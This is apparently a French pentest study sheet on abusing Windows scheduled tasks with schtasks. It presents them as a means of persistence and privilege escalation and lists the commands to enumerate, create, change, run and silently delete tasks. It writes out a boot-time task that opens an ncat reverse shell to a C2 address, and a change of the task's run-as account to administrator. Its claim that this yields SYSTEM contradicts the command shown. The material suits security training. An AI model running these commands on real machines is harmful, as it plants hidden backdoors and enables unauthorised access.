# Scheduled Tasks (Windows)

## <mark style="color:red;">Scheduled Tasks (Windows)</mark>

***

### <mark style="color:blue;">🔎 Qu’est-ce qu’une tâche planifiée (Scheduled Task) ?</mark>

Une **tâche planifiée** est un mécanisme Windows permettant d’exécuter automatiquement une action lorsque **une condition (trigger)** est remplie.

👉 Pour un **administrateur** : automatisation\
👉 Pour un **attaquant** : **PERSISTANCE + ÉLÉVATION DE PRIVILÈGES**

***

### <mark style="color:blue;">🎯 Pourquoi les attaquants adorent les Scheduled Tasks ?</mark>

* Pas besoin de drop un malware visible
* Fonctionne avec des outils natifs Windows
* Peut s’exécuter :
  * au démarrage
  * à la connexion utilisateur
  * en SYSTEM
* Très discret vis-à-vis de l’antivirus

***

### <mark style="color:blue;">⚡ Exemples d’utilisation offensive</mark>

* Backdoor persistante
* Reverse shell automatique
* Relance d’un accès après reboot
* Escalade vers SYSTEM

***

### <mark style="color:blue;">🔔 Triggers (déclencheurs) possibles</mark>

Une tâche peut se lancer :

* Lors d’un **événement système**
* À une **heure précise**
* Quotidiennement / Hebdomadairement / Mensuellement
* Quand la machine devient **inactive**
* **Au démarrage du système**
* **À la connexion d’un utilisateur**
* Lors d’un changement de session RDP

👉 **Très puissant pour la persistance**

***

## <mark style="color:blue;">🛠️ Outil principal :</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`schtasks`</mark>

`schtasks.exe` est l’outil en ligne de commande pour :

* lister les tâches
* créer des tâches
* modifier des tâches
* supprimer des tâches
* les exécuter manuellement

***

## <mark style="color:red;">📋 PARTIE 1 – Lister les tâches existantes</mark>

### <mark style="color:blue;">🔹 Syntaxe générale</mark>

```cmd
schtasks /query [options]
```

***

### 🔑 Paramètres importants

| Paramètre | Rôle                                  |
| --------- | ------------------------------------- |
| `/query`  | Liste les tâches                      |
| `/fo`     | Format d’affichage (TABLE, LIST, CSV) |
| `/v`      | Mode verbeux (détails avancés)        |
| `/nh`     | Supprime l’en-tête                    |
| `/s`      | Machine distante                      |
| `/u`      | Utilisateur                           |
| `/p`      | Mot de passe                          |

***

### <mark style="color:blue;">✅ Commande standard recommandée (pentest)</mark>

```cmd
schtasks /query /v /fo list
```

***

### <mark style="color:blue;">📤 Analyse de la sortie (expliquée)</mark>

Exemple :

```
TaskName: \Check Network Access
Next Run Time: N/A
Status: Ready
Logon Mode: Interactive only
Task To Run: C:\Windows\System32\cmd.exe ping 8.8.8.8
Run As User: tru7h
Schedule Type: At system start up
```

#### <mark style="color:green;">🔍 Interprétation</mark>

| Champ         | Signification            |
| ------------- | ------------------------ |
| TaskName      | Nom de la tâche          |
| Status        | Prête à s’exécuter       |
| Task To Run   | Commande exécutée        |
| Run As User   | **Utilisateur critique** |
| Schedule Type | **Trigger**              |

👉 **Toujours vérifier :**

* `Run As User`
* `Task To Run`
* `Schedule Type`

***

## <mark style="color:red;">➕ PARTIE 2 – Créer une nouvelle tâche</mark>

### <mark style="color:blue;">🔹 Syntaxe minimale obligatoire</mark>

```cmd
schtasks /create /sc <schedule> /tn <nom> /tr <commande>
```

***

### <mark style="color:blue;">🔑 Paramètres essentiels</mark>

| Paramètre | Rôle                  |
| --------- | --------------------- |
| `/create` | Création              |
| `/sc`     | Type de planification |
| `/tn`     | Nom de la tâche       |
| `/tr`     | Commande à exécuter   |
| `/ru`     | Utilisateur           |
| `/rp`     | Mot de passe          |
| `/rl`     | Niveau de privilèges  |
| `/z`      | Auto-suppression      |

***

### <mark style="color:blue;">🚨 Exemple offensif – Reverse shell au démarrage</mark>

{% code fullWidth="true" %}
```cmd
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
```
{% endcode %}

#### <mark style="color:green;">🔍 Analyse</mark>

| Élément  | Explication       |
| -------- | ----------------- |
| ONSTART  | S’exécute au boot |
| ncat.exe | Outil réseau      |
| IP:PORT  | Serveur C2        |

👉 À chaque reboot → **shell automatique**

***

### <mark style="color:green;">📤 Sortie</mark>

```
SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```

✔️ La tâche est installée

***

## <mark style="color:red;">✏️ PARTIE 3 – Modifier une tâche existante</mark>

### <mark style="color:blue;">🔹 Syntaxe</mark>

```cmd
schtasks /change /tn <nom> [options]
```

***

### <mark style="color:blue;">🔑 Paramètres utiles</mark>

| Paramètre  | Rôle                  |
| ---------- | --------------------- |
| `/tr`      | Modifier la commande  |
| `/ru`      | Changer l’utilisateur |
| `/rp`      | Mot de passe          |
| `/enable`  | Activer               |
| `/disable` | Désactiver            |

***

### <mark style="color:blue;">🚀 Exemple – Passer la tâche en ADMIN/SYSTEM</mark>

```cmd
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
```

📤 Sortie :

```
SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
```

👉 **Élévation de privilèges potentielle**

***

### <mark style="color:blue;">🔎 Vérification</mark>

```cmd
schtasks /query /tn "My Secret Task" /v /fo list
```

Champ critique :

```
Run As User: SYSTEM
```

🔥 **Shell SYSTEM garanti au prochain trigger**

***

## <mark style="color:red;">▶️ PARTIE 4 – Lancer une tâche manuellement</mark>

```cmd
schtasks /run /tn "My Secret Task"
```

👉 Utile pour tester si elle fonctionne sans attendre le reboot.

***

## <mark style="color:red;">❌ PARTIE 5 – Supprimer une tâche</mark>

### <mark style="color:green;">🔹 Syntaxe</mark>

```cmd
schtasks /delete /tn <nom>
```

***

### <mark style="color:green;">Exemple</mark>

```cmd
schtasks /delete /tn "My Secret Task"
```

📤 Message :

```
Are you sure? (Y/N)
```

***

### Suppression silencieuse

```cmd
schtasks /delete /tn "My Secret Task" /f
```

👉 Pas de confirmation

***

## <mark style="color:red;">🧠 Résumé Pentest</mark>

| Action | Utilité     |
| ------ | ----------- |
| Query  | Enumération |
| Create | Persistance |
| Change | Escalade    |
| Run    | Test        |
| Delete | Nettoyage   |

***

| Commande                                                                                    | Description                                                 |
| ------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `schtasks /query`                                                                           | Lister les tâches planifiées                                |
| `schtasks /query /v /fo list`                                                               | Lister les tâches en mode verbeux (recommandé pentest)      |
| `schtasks /query /tn "My Secret Task" /v /fo list`                                          | Vérifier une tâche spécifique en détail                     |
| `schtasks /create /sc <schedule> /tn <nom> /tr <commande>`                                  | Créer une tâche planifiée (syntaxe minimale)                |
| `schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\...\ncat.exe 172.16.1.100 8100"` | Créer un reverse shell au démarrage                         |
| `schtasks /change /tn <nom>`                                                                | Modifier une tâche existante (syntaxe de base)              |
| `schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"`                    | Changer l'utilisateur d'exécution (élévation de privilèges) |
| `schtasks /run /tn "My Secret Task"`                                                        | Lancer manuellement une tâche                               |
| `schtasks /delete /tn "My Secret Task"`                                                     | Supprimer une tâche (avec confirmation)                     |
| `schtasks /delete /tn "My Secret Task" /f`                                                  | Supprimer une tâche sans confirmation                       |

***

**Rappel des paramètres clés :**

| Paramètre | Rôle                                                     |
| --------- | -------------------------------------------------------- |
| `/fo`     | Format d'affichage : `TABLE`, `LIST`, `CSV`              |
| `/v`      | Mode verbeux                                             |
| `/sc`     | Type de planification (`ONSTART`, `ONLOGON`, `DAILY`...) |
| `/tn`     | Nom de la tâche                                          |
| `/tr`     | Commande à exécuter                                      |
| `/ru`     | Utilisateur d'exécution                                  |
| `/rp`     | Mot de passe de l'utilisateur                            |
| `/rl`     | Niveau de privilèges                                     |
| `/f`      | Force (sans confirmation)                                |
| `/z`      | Auto-suppression après exécution                         |
| `/s`      | Machine distante                                         |
